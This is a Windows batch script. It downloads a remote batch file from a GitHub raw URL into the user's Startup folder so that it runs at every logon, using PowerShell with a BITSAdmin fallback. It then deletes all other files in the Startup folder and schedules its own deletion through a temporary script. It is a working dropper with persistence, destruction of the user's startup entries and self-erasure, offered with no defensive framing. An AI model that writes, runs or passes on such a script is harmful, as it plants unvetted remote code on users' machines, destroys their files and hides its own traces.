@echo off
setlocal

:: Define the URL of the script to download
set "SCRIPT_URL=https://raw.githubusercontent.com/wicorn29/batch/main/up.bat"

:: Define the destination path in the startup folder
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "DESTINATION_PATH=%STARTUP_FOLDER%\up.bat"

:: Download the script using PowerShell
echo Downloading script from %SCRIPT_URL% to %DESTINATION_PATH%...
powershell -Command "try { Invoke-WebRequest -Uri %SCRIPT_URL% -OutFile %DESTINATION_PATH% } catch { exit 1 }"
if %errorlevel% neq 0 (
    echo PowerShell download failed. Trying BITSAdmin...
    bitsadmin /transfer "Job" %SCRIPT_URL% %DESTINATION_PATH%
)

:: Check if the download was successful
if exist %DESTINATION_PATH% (
    echo Script downloaded successfully and placed in startup folder.

    :: Delete all other files in the startup folder
    echo Deleting all other files in the startup folder...
    for %%f in ("%STARTUP_FOLDER%\*") do (
        if not "%%f"=="%DESTINATION_PATH%" (
            del "%%f"
        )
    )

    :: Schedule self-deletion
    echo Deleting self...
    (echo @echo off
    echo timeout 2
    echo del "%~f0") > "%TEMP%\delme.bat"
    start "" "%TEMP%\delme.bat"
) else (
    echo Failed to download the script.
)

endlocal
exit
